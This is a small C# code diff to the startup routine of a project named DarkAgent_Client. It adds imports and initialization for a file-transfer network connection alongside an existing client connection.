@@ -2,8 +2,10 @@
 using DarkAgent_Client.src.Features;
 using DarkAgent_Client.src.Network.DataNetwork;
 using DarkAgent_Client.src.Network.DataNetwork.Packets;
+using DarkAgent_Client.src.Network.FileNetwork;
 using DarkAgent_Client.src.Utils;
 using Microsoft.Win32;
+using DarkAgent_Client.src.Network.FileNetwork.Packets;
 
 namespace DarkAgent_Client
 {
@@ -19,6 +21,8 @@ namespace DarkAgent_Client
 
             ClientPacketProcessor.Initialize();
             Client = new ClientConnect();
+            FileClientPacketProcessor.Initialize();
+            FileTransferConnect _FileTransfer = new FileTransferConnect();
             Application.Run();
         }
 
